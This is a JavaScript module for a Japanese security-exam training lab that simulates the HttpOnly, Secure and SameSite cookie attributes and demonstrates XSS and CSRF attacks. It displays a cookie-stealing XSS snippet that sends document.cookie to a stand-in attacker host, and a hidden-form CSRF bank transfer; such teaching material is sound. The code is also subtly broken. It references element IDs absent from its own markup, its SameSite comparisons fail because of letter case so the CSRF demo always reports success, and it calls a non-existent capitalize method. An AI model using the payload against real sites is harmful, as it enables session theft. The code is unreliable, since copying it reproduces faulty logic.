/**
 * Module 13: Cookie & Web Security (HttpOnly, Secure, SameSite) Lab
 */
window.SecurityLabModules["cookie_security"] = {
    html: `
        <div class="lab-container">
            <!-- Navigation Tabs -->
            <div class="tab-container">
                <button class="btn-tab active" id="btnTabCookieFlow">① Cookie属性と送信制御</button>
                <button class="btn-tab" id="btnTabCookieAttack">② 脆弱性・攻撃の実証 (XSS & CSRF)</button>
            </div>

            <!-- TAB 1: Cookie Flow & Attributes -->
            <div id="panelCookieFlow" class="tab-panel active">
                <div class="card" style="margin-bottom: 20px;">
                    <h3>🍪 Cookie属性 (HttpOnly / Secure / SameSite) とブラウザ送信挙動</h3>
                    <p class="card-subtitle">Cookieに付与する各種セキュリティ属性が、HTTP通信およびブラウザの送信制御にどのように影響するかをシミュレーションします。</p>
                    
                    <div class="lab-grid-2" style="gap: 20px; margin-top: 15px;">
                        <!-- Left: Cookie Attribute Settings -->
                        <div style="background: var(--bg-card); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 16px; display: flex; flex-direction: column; gap: 12px;">
                            <span class="text-base" style="font-weight: bold; color: var(--text-primary); display: block; border-bottom: 1px solid var(--border-color); padding-bottom: 4px;">1. Cookie発行属性の設定</span>
                            
                            <div style="display: flex; align-items: center; justify-content: space-between;">
                                <label class="text-base" style="margin: 0;">HttpOnly属性:</label>
                                <input type="checkbox" id="cookieHttpOnly" checked style="width: 18px; height: 18px; cursor: pointer;">
                            </div>
                            <span class="text-xs text-muted" style="margin-top: -4px;">※ JavaScript (document.cookie) からのアクセス可否</span>
                            
                            <div style="display: flex; align-items: center; justify-content: space-between;">
                                <label class="text-base" style="margin: 0;">Secure属性:</label>
                                <input type="checkbox" id="cookieSecure" checked style="width: 18px; height: 18px; cursor: pointer;">
                            </div>
                            <span class="text-xs text-muted" style="margin-top: -4px;">※ 暗号化通信 (HTTPS) 時のみ送信を許可</span>
                            
                            <div class="form-group" style="margin: 0;">
                                <label class="text-base">SameSite属性:</label>
                                <select id="cookieSameSite" style="width: 100%;">
                                    <option value="Lax" selected>SameSite=Lax (推奨: トップレベル遷移のみ送信)</option>
                                    <option value="Strict">SameSite=Strict (完全制限: 同一サイトのみ送信)</option>
                                    <option value="None">SameSite=None (制限なし: クロスサイト送信可)</option>
                                </select>
                            </div>
                            <span class="text-xs text-muted" style="margin-top: -4px;">※ クロスサイトリクエスト時の送信制限</span>

                            <span class="text-base" style="font-weight: bold; color: var(--text-primary); display: block; border-bottom: 1px solid var(--border-color); padding-bottom: 4px; margin-top: 10px;">2. リクエスト送信条件</span>
                            
                            <div class="form-group" style="margin: 0;">
                                <label class="text-base">通信プロトコル:</label>
                                <select id="cookieProtocol" style="width: 100%;">
                                    <option value="https" selected>HTTPS (暗号化通信 - ポート 443)</option>
                                    <option value="http">HTTP (平文通信 - ポート 80)</option>
                                </select>
                            </div>
                            
                            <div class="form-group" style="margin: 0;">
                                <label class="text-base">送信元・リクエストタイプ:</label>
                                <select id="cookieReqType" style="width: 100%;">
                                    <option value="same_site" selected>同一サイト内リクエスト (Same-Origin)</option>
                                    <option value="cross_site_top">外部サイトからのリンク遷移 (Top-level GET)</option>
                                    <option value="cross_site_post">外部サイトからのPOST送信 (CSRF型リクエスト)</option>
                                    <option value="cross_site_fetch">外部サイトからの非同期Fetch/XHR</option>
                                </select>
                            </div>
                            
                            <div style="display: flex; gap: 8px; margin-top: 6px;">
                                <button class="btn btn-primary text-base" id="btnSimulateCookie" style="flex: 1; padding: 8px;">シミュレーション実行</button>
                                <button class="btn text-base" id="btnResetCookieFlow" style="padding: 8px; border: 1px solid var(--border-color); background: transparent;">リセット</button>
                            </div>
                        </div>

                        <!-- Right: Visual Delivery & Results -->
                        <div style="display: flex; flex-direction: column; gap: 12px;">
                            <div style="background: var(--bg-app); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 16px; min-height: 140px; display: flex; flex-direction: column; justify-content: center; position: relative;">
                                <span class="text-base" style="font-weight: bold; color: var(--text-primary); display: block; margin-bottom: 6px;">リクエスト配送可否の可視化</span>
                                <div style="display: flex; align-items: center; justify-content: space-around; width: 100%; margin-top: 10px; position: relative;">
                                    <div style="text-align: center;">
                                        <span class="node-icon-lg" id="nodeClientBrowser">🌐</span>
                                        <div class="text-xs text-muted" style="margin-top: 2px;">ブラウザ</div>
                                    </div>
                                    <div style="flex: 1; height: 2px; background-color: var(--border-color); margin: 0 16px; position: relative;" id="lineCookieFlow">
                                        <div id="dotCookiePacket" style="position: absolute; top: -5px; left: 0%; width: 12px; height: 12px; border-radius: 50%; background-color: var(--color-primary); display: none; transition: left 0.8s ease-in-out;"></div>
                                        <span id="labelCookiePacket" class="text-xs" style="position: absolute; top: -20px; left: 50%; transform: translateX(-50%); padding: 3px 6px; border-radius: 4px; background: var(--bg-terminal); border: 1px solid var(--border-color); color: #fff; display: none;">🍪 SessionID</span>
                                    </div>
                                    <div style="text-align: center;">
                                        <span class="node-icon-lg" id="nodeTargetServer">🏢</span>
                                        <div class="text-xs text-muted" style="margin-top: 2px;">対象サーバー</div>
                                    </div>
                                </div>
                                <div class="text-base text-muted" style="text-align: center; margin-top: 6px; min-height: 15px;" id="textCookieFlowStatus">待機中</div>
                            </div>

                            <div style="flex: 1; display: flex; flex-direction: column;">
                                <label class="text-base">シミュレーション詳細判定:</label>
                                <div class="code-log-box" style="flex: 1; display: flex; flex-direction: column; gap: 8px;">
                                    <div id="cookieReportHeader">「シミュレーション実行」を押してください。</div>
                                    <div id="cookieReportDesc" class="text-muted"></div>
                                    <div id="cookieReportAdvice" style="color: #fbbf24;"></div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="callout-box callout-primary text-base text-muted" style="margin-top: 20px;">
                        <span class="text-primary-color" style="font-weight: bold; display: block; margin-bottom: 4px;">💡 セキスペ試験攻略：Cookie 属性とセキュリティ防衛</span>
                        <b>・HttpOnly属性</b>: XSS脆弱性により悪意あるスクリプトが注入されても、<code>document.cookie</code> の読み取りをブラウザがブロックするため、セッションハイジャックの被害を最小限に食い止めます。<br>
                        <b>・Secure属性</b>: 平文のHTTP通信でCookieが送出されるのを防ぎ、公衆Wi-Fi等での盗聴・セッション乗っ取りを防止します。<br>
                        <b>・SameSite属性</b>: 外部サイトを踏ませて不正リクエストを送信させる <b>CSRF (Cross-Site Request Forgery)</b> の根本的な緩和策となります。近代ブラウザでは <code>SameSite=Lax</code> がデフォルト適用されますが、重要操作（送金・パスワード変更など）ではワンタイムトークン（抗CSRFトークン）の併用が必須です。
                    </div>
                </div>
            </div>

            <!-- TAB 2: Attack Demos (XSS & CSRF) -->
            <div id="panelCookieAttack" class="tab-panel">
                <div class="card" style="margin-bottom: 20px;">
                    <h3>💥 攻撃シミュレーション：XSSによるCookie盗聴 ＆ CSRFによる不正リクエスト</h3>
                    <p class="card-subtitle">脆弱な設定と強固なCookie属性設定で、実際の攻撃がどのように成否を分けるかを体感します。</p>
                    
                    <div class="lab-grid-2" style="gap: 20px; margin-top: 15px;">
                        
                        <!-- Scenario 1: XSS -->
                        <div style="background: var(--bg-card); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 16px; display: flex; flex-direction: column; gap: 12px;">
                            <div style="display: flex; justify-content: space-between; align-items: center;">
                                <span class="text-base" style="font-weight: bold; color: var(--text-primary);">🪲 シナリオ 1: XSS攻撃によるセッション盗聴</span>
                                <span id="badgeXssStatus" class="subtab-badge">未実行</span>
                            </div>
                            <p class="text-base text-muted" style="margin: 0; line-height: 1.5;">
                                攻撃者が掲示板等に悪意あるJavaScriptを注入したシチュエーションです。
                            </p>
                            <div class="code-log-box text-danger-color" style="padding: 10px;">
                                &lt;script&gt;<br>
                                &nbsp;&nbsp;const stolenCookie = document.cookie;<br>
                                &nbsp;&nbsp;fetch("https://attacker.evil/steal?c=" + stolenCookie);<br>
                                &lt;/script&gt;
                            </div>
                            <div style="display: flex; gap: 10px; align-items: center;">
                                <div class="text-base">
                                    HttpOnly: <b id="lblXssHttpOnly" class="text-success-color">ON</b>
                                </div>
                                <button class="btn btn-primary text-base" id="btnExecuteXss" style="padding: 7px 14px;">XSS攻撃を実行</button>
                            </div>
                            <div class="code-log-box" style="height: 100px; padding: 10px;" id="logXssAttack">
                                ログ待機中...
                            </div>
                        </div>

                        <!-- Scenario 2: CSRF -->
                        <div style="background: var(--bg-card); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 16px; display: flex; flex-direction: column; gap: 12px;">
                            <div style="display: flex; justify-content: space-between; align-items: center;">
                                <span class="text-base" style="font-weight: bold; color: var(--text-primary);">🕵️ シナリオ 2: CSRF攻撃による勝手な口座送金</span>
                                <span id="badgeCsrfStatus" class="subtab-badge">未実行</span>
                            </div>
                            <p class="text-base text-muted" style="margin: 0; line-height: 1.5;">
                                罠サイト（<code>evil.net</code>）を開いたユーザーから、自動的に送金POSTリクエストがターゲット銀行へ送られます。
                            </p>
                            <div class="code-log-box text-danger-color" style="padding: 10px;">
                                &lt;form action="https://bank.example/transfer" method="POST"&gt;<br>
                                &nbsp;&nbsp;&lt;input type="hidden" name="to" value="attacker"&gt;<br>
                                &nbsp;&nbsp;&lt;input type="hidden" name="amount" value="1000000"&gt;<br>
                                &lt;/form&gt;
                                <div class="text-base" style="margin-top: 6px;">
                                    現在の設定: <span id="textCsrfSameSiteStatus" class="text-primary-color" style="font-weight: bold;">SameSite: Lax</span>
                                </div>
                                <button class="btn btn-primary text-base" id="btnExecuteCsrf" style="padding: 7px 14px; margin-top: 6px;">CSRF攻撃を実行</button>
                            </div>

                            <div class="code-log-box" style="height: 100px; padding: 10px;" id="logCsrfAttack">
                                攻撃を実行すると、リクエスト送信時のCookie挙動と攻撃結果がここに表示されます。
                            </div>
                        </div>

                    </div>

                    <!-- Footnotes: Detailed SameSite specs -->
                    <div class="callout-box callout-warning text-base text-muted" style="margin-top: 20px;">
                        <span class="text-warning-color" style="font-weight: bold; border-bottom: 1px solid var(--border-subtle-warning); padding-bottom: 4px; display: block; margin-bottom: 8px;">🔑 セキスペ重要出題ポイント：SameSite 3属性の挙動</span>
                        <table class="text-sm" style="width: 100%; border-collapse: collapse; text-align: left;">
                            <thead>
                                <tr style="border-bottom: 1px solid var(--border-subtle-warning); color: var(--text-primary);">
                                    <th style="padding: 4px;">属性値</th>
                                    <th style="padding: 4px;">同一サイト内 (First-party)</th>
                                    <th style="padding: 4px;">クロスサイトGET (外部リンク遷移)</th>
                                    <th style="padding: 4px;">クロスサイトPOST (CSRFフォーム等)</th>
                                    <th style="padding: 4px;">セキスペ出題対策</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr style="border-bottom: 1px dotted rgba(251,191,36,0.1);">
                                    <td style="padding: 6px; font-weight: bold; color: var(--text-primary);">Strict</td>
                                    <td style="padding: 6px; color: var(--color-success);">送信する</td>
                                    <td style="padding: 6px; color: #f87171;">送信しない</td>
                                    <td style="padding: 6px; color: #f87171;">送信しない</td>
                                    <td style="padding: 6px;">もっとも厳格。別サイトからの遷移リンクでもCookieが送信されないため、再ログインが必要になるデメリットがあります。</td>
                                </tr>
                                <tr style="border-bottom: 1px dotted rgba(251,191,36,0.1);">
                                    <td style="padding: 6px; font-weight: bold; color: var(--text-primary);">Lax</td>
                                    <td style="padding: 6px; color: var(--color-success);">送信する</td>
                                    <td style="padding: 6px; color: var(--color-success);">送信する (安全な遷移のみ)</td>
                                    <td style="padding: 6px; color: #f87171;">送信しない</td>
                                    <td style="padding: 6px;">標準設定。<b>GETによる通常の遷移（リンククリックなど）ではCookieが乗り、POST（フォーム送信等）では乗らない</b>ため、利便性とCSRF対策を両立します。</td>
                                </tr>
                                <tr>
                                    <td style="padding: 6px; font-weight: bold; color: var(--text-primary);">None</td>
                                    <td style="padding: 6px; color: var(--color-success);">送信する</td>
                                    <td style="padding: 6px; color: var(--color-success);">送信する</td>
                                    <td style="padding: 6px; color: var(--color-success);">送信する</td>
                                    <td style="padding: 6px; color: #f87171;">いかなるクロスサイト通信でもCookieを送信します。<b>※None設定時には、必ず Secure属性の付与が義務付けられています (SameSite=None; Secure)</b>。</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    `,

    references: [
        { source: "RFC 6265bis", title: "Cookies: HTTP State Management Mechanism (SameSite Attributes)", url: "https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis", note: "Cookie仕様およびSameSite属性の標準化草案" },
        { source: "MDN Web Docs", title: "HTTP Cookie の使用とセキュリティ (Secure, HttpOnly, SameSite)", url: "https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies", note: "WebセキュリティにおけるCookie制御ガイド" },
        { source: "IPA 独立行政法人 情報処理推進機構", title: "安全なウェブサイトの作り方 - セッション管理とCookieの保護", url: "https://www.ipa.go.jp/security/vuln/websecurity.html" }
    ],

    init: function(app) {
        // Tab switching
        const btnTabCookieFlow = document.getElementById("btnTabCookieFlow");
        const btnTabCookieAttack = document.getElementById("btnTabCookieAttack");
        const panelCookieFlow = document.getElementById("panelCookieFlow");
        const panelCookieAttack = document.getElementById("panelCookieAttack");

        btnTabCookieFlow.addEventListener("click", () => {
            btnTabCookieFlow.classList.add("active");
            btnTabCookieAttack.classList.remove("active");
            panelCookieFlow.style.display = "block";
            panelCookieAttack.style.display = "none";
            app.log("system", "[Cookieセキュリティ] 設定・送信制御画面に切り替えました。");
        });

        btnTabCookieAttack.addEventListener("click", () => {
            btnTabCookieFlow.classList.remove("active");
            btnTabCookieAttack.classList.add("active");
            panelCookieFlow.style.display = "none";
            panelCookieAttack.style.display = "block";
            
            // Sync status strings on the attack panels
            updateAttackStatusTexts();
            app.log("system", "[Cookieセキュリティ] XSS/CSRF攻撃実証画面に切り替えました。");
        });

        // Config elements
        const cookieHttpOnly = document.getElementById("cookieHttpOnly");
        const cookieSecure = document.getElementById("cookieSecure");
        const cookieSameSite = document.getElementById("cookieSameSite");
        const cookieProtocol = document.getElementById("cookieProtocol");
        const cookieReqType = document.getElementById("cookieReqType");

        // Action elements
        const btnSimulateCookie = document.getElementById("btnSimulateCookie");
        const btnResetCookieFlow = document.getElementById("btnResetCookieFlow");
        
        // Output elements
        const dotCookieFlow = document.getElementById("dotCookieFlow");
        const labelCookiePacket = document.getElementById("labelCookiePacket");
        const textCookieFlowStatus = document.getElementById("textCookieFlowStatus");
        const textCookieAttrHeader = document.getElementById("textCookieAttrHeader");
        const textCookieSentResult = document.getElementById("textCookieSentResult");
        const textCookieJsResult = document.getElementById("textCookieJsResult");

        // Attack elements
        const btnExecuteXss = document.getElementById("btnExecuteXss");
        const btnExecuteCsrf = document.getElementById("btnExecuteCsrf");
        const logXssAttack = document.getElementById("logXssAttack");
        const logCsrfAttack = document.getElementById("logCsrfAttack");
        const badgeXssStatus = document.getElementById("badgeXssStatus");
        const badgeCsrfStatus = document.getElementById("badgeCsrfStatus");
        const textXssHttpOnlyStatus = document.getElementById("textXssHttpOnlyStatus");
        const textCsrfSameSiteStatus = document.getElementById("textCsrfSameSiteStatus");

        function updateAttackStatusTexts() {
            const httponlyVal = cookieHttpOnly.checked ? "ON" : "OFF";
            const samesiteVal = cookieSameSite.value.toUpperCase();
            
            textXssHttpOnlyStatus.innerText = `HttpOnly: ${httponlyVal}`;
            textXssHttpOnlyStatus.style.color = cookieHttpOnly.checked ? "var(--color-success)" : "#f87171";
            
            textCsrfSameSiteStatus.innerText = `SameSite: ${samesiteVal}`;
            textCsrfSameSiteStatus.style.color = (samesiteVal === "STRICT" || samesiteVal === "LAX") ? "var(--color-success)" : "#f87171";
        }

        // Keep SameSite vs Secure requirement matching
        cookieSameSite.addEventListener("change", () => {
            if (cookieSameSite.value === "none") {
                cookieSecure.checked = true;
                cookieSecure.disabled = true;
                app.log("warning", "[仕様制約] SameSite=None を指定する場合、主要ブラウザの仕様により Secure属性の付与が必須になります。");
            } else {
                cookieSecure.disabled = false;
            }
        });

        function clearFlowAnimation() {
            dotCookieFlow.style.display = "none";
            dotCookieFlow.style.left = "0px";
            labelCookiePacket.style.display = "none";
            document.getElementById("nodeClientBrowser").style.transform = "none";
            document.getElementById("nodeTargetServer").style.transform = "none";
        }

        async function animatePacket(hasCookie) {
            clearFlowAnimation();
            
            // Highlight sender
            document.getElementById("nodeClientBrowser").style.transform = "scale(1.2)";
            await new Promise(r => setTimeout(r, 200));
            document.getElementById("nodeClientBrowser").style.transform = "none";

            // Show dot and optionally packet label
            dotCookieFlow.style.display = "block";
            dotCookieFlow.style.transition = "none";
            dotCookieFlow.style.left = "0px";
            
            if (hasCookie) {
                labelCookiePacket.style.display = "block";
            }

            await new Promise(r => setTimeout(r, 50));
            dotCookieFlow.style.transition = "left 1000ms linear";
            dotCookieFlow.style.left = "calc(100% - 8px)";
            
            await new Promise(r => setTimeout(r, 1050));
            
            dotCookieFlow.style.display = "none";
            labelCookiePacket.style.display = "none";
            
            // Highlight receiver
            document.getElementById("nodeTargetServer").style.transform = "scale(1.2)";
            await new Promise(r => setTimeout(r, 200));
            document.getElementById("nodeTargetServer").style.transform = "none";
        }

        // RESET FLOW
        btnResetCookieFlow.addEventListener("click", () => {
            clearFlowAnimation();
            textCookieFlowStatus.innerText = "待機中";
            textCookieAttrHeader.innerHTML = "Set-Cookie ヘッダー例がここに表示されます。";
            textCookieAttrHeader.style.color = "var(--text-secondary)";
            textCookieSentResult.innerHTML = "シミュレーションを実行してください。";
            textCookieSentResult.style.color = "var(--text-secondary)";
            textCookieJsResult.innerHTML = "JavaScript からの読み取り可否も判定します。";
            textCookieJsResult.style.color = "var(--text-secondary)";
            app.log("system", "[Cookieセキュリティ] 設定状態をリセットしました。");
        });

        // SIMULATE COOKIE SEND
        btnSimulateCookie.addEventListener("click", async () => {
            btnSimulateCookie.disabled = true;
            textCookieFlowStatus.innerText = "通信開始中...";
            
            const http_only = cookieHttpOnly.checked;
            const secure = cookieSecure.checked;
            const same_site = cookieSameSite.value;
            const protocol = cookieProtocol.value;
            const req_type = cookieReqType.value;

            try {
                // Call simulator backend API
                const response = await fetch("/api/cookie/simulate", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        http_only: http_only,
                        secure: secure,
                        same_site: same_site,
                        request_type: req_type,
                        use_https: (protocol === "https")
                    })
                });

                if (!response.ok) {
                    throw new Error("HTTP error " + response.status);
                }

                const result = await response.json();
                
                // Animate packet transmission
                textCookieFlowStatus.innerText = "ブラウザがCookie送信条件を検証中...";
                await animatePacket(result.cookie_sent);

                // Update UI elements based on response
                textCookieFlowStatus.innerText = result.cookie_sent ? "データ転送成功" : "送信ブロック";
                
                textCookieAttrHeader.innerHTML = `<span style="color: #60a5fa;">【レスポンスヘッダ】</span><br>${result.set_cookie_header}`;
                textCookieAttrHeader.style.color = "#a78bfa";

                if (result.cookie_sent) {
                    textCookieSentResult.innerHTML = `🟢 <b>Cookie送信成功</b>: ${result.reason}`;
                    textCookieSentResult.style.color = "var(--color-success)";
                } else {
                    textCookieSentResult.innerHTML = `🔴 <b>Cookie送信失敗</b>: ${result.reason}`;
                    textCookieSentResult.style.color = "#f87171";
                }

                if (result.js_readable) {
                    textCookieJsResult.innerHTML = `⚠️ <b>JS読込可能 (脆弱)</b>: ${result.js_reason}`;
                    textCookieJsResult.style.color = "#fbbf24";
                } else {
                    textCookieJsResult.innerHTML = `🛡️ <b>JSアクセス不可 (安全)</b>: ${result.js_reason}`;
                    textCookieJsResult.style.color = "var(--color-success)";
                }

                // Add to general app console log
                if (result.cookie_sent) {
                    app.log("success", `[Cookie送信] ${req_type === "normal" ? "同一サイト内" : "クロスサイト"}で Cookie が送信されました。`);
                } else {
                    app.log("error", `[Cookie送信ブロック] ${result.reason}`);
                }

            } catch (err) {
                app.log("error", "[APIエラー] CookieシミュレーションAPIの通信に失敗しました: " + err.message);
                textCookieFlowStatus.innerText = "通信エラー";
            } finally {
                btnSimulateCookie.disabled = false;
            }
        });

        // ----------------------------------------------------
        // ATTACK DEMOS
        // ----------------------------------------------------

        // XSS Attack Execution
        btnExecuteXss.addEventListener("click", async () => {
            btnExecuteXss.disabled = true;
            logXssAttack.innerHTML = "⚡ 悪意あるスクリプトを注入中...<br>";
            await new Promise(r => setTimeout(r, 600));
            
            const hasHttpOnly = cookieHttpOnly.checked;
            
            logXssAttack.innerHTML += "🔍 <code>document.cookie</code> の読み取りを試行します...<br>";
            await new Promise(r => setTimeout(r, 800));

            if (hasHttpOnly) {
                logXssAttack.innerHTML += `<span style="color: #34d399;">🛡️ 結果: 空白またはセッションIDが含まれません。</span><br>`;
                logXssAttack.innerHTML += `<span style="color: #60a5fa;">[解説] HttpOnly属性が有効なため、ブラウザはスクリプトからのCookieアクセスを完全にブロックしました。攻撃者にセッションIDが漏洩するのを防御できました。</span>`;
                badgeXssStatus.innerText = "防御成功";
                badgeXssStatus.className = "badge badge-success";
                app.log("success", "[XSS攻撃実証] HttpOnlyが有効なため、悪意あるスクリプトによるセッションハイジャックを阻止しました。");
            } else {
                logXssAttack.innerHTML += `<span style="color: #f87171;">🚨 警告: Cookieの取得に成功しました！</span><br>`;
                logXssAttack.innerHTML += `<span style="color: #d97706;">&nbsp;&nbsp;➔ 取得値: [session_id=sess_abc123]</span><br>`;
                logXssAttack.innerHTML += `<span style="color: #f87171;">📡 攻撃者サーバ (http://attacker.com/leak) へセッション情報を転送完了。アカウントが乗っ取られました。</span>`;
                badgeXssStatus.innerText = "攻撃成立";
                badgeXssStatus.className = "badge badge-danger";
                app.log("error", "[XSS攻撃実証] HttpOnlyが無効なため、悪意あるスクリプトによってセッションIDが窃取されました！");
            }

            btnExecuteXss.disabled = false;
        });

        // CSRF Attack Execution
        btnExecuteCsrf.addEventListener("click", async () => {
            btnExecuteCsrf.disabled = true;
            logCsrfAttack.innerHTML = "😈 罠サイトにアクセスしました...<br>";
            await new Promise(r => setTimeout(r, 500));
            
            logCsrfAttack.innerHTML += "📦 罠サイト内の非表示フォームから <code>https://bank.com/transfer</code> (送金API) へPOSTリクエストを自動送信します...<br>";
            await new Promise(r => setTimeout(r, 800));

            const samesite = cookieSameSite.value;

            // In real CSRF, browser determines Cookie attachment based on SameSite attribute
            if (samesite === "strict" || samesite === "lax") {
                logCsrfAttack.innerHTML += `<span style="color: #34d399;">🛡️ 結果: Cookieなしでのリクエストを検知。銀行サーバーが認証エラー「401 Unauthorized」を返しました。</span><br>`;
                logCsrfAttack.innerHTML += `<span style="color: #60a5fa;">[解説] SameSite=${samesite.capitalize()} 属性が有効なため、クロスサイトからのPOST送信時にブラウザがCookie（セッション情報）を添付するのを自動ブロックしました。CSRF攻撃を防ぎました。</span>`;
                badgeCsrfStatus.innerText = "防御成功";
                badgeCsrfStatus.className = "badge badge-success";
                app.log("success", `[CSRF攻撃実証] SameSite=${samesite.capitalize()} により、クロスサイトPOSTでのCookie添付が拒否され、不正送金を防止しました。`);
            } else {
                logCsrfAttack.innerHTML += `<span style="color: #f87171;">🚨 警告: ブラウザがCookie [session_id=sess_abc123] を自動添付して送信しました！</span><br>`;
                logCsrfAttack.innerHTML += `<span style="color: #f87171;">💸 口座から 100,000 円が攻撃者の口座へ送金されました（送金処理完了）。</span>`;
                badgeCsrfStatus.innerText = "攻撃成立";
                badgeCsrfStatus.className = "badge badge-danger";
                app.log("error", "[CSRF攻撃実証] SameSite=None なのでクロスサイトPOSTリクエストにCookieが添付され、不正送金（CSRF）が成功してしまいました！");
            }

            btnExecuteCsrf.disabled = false;
        });
    }
};
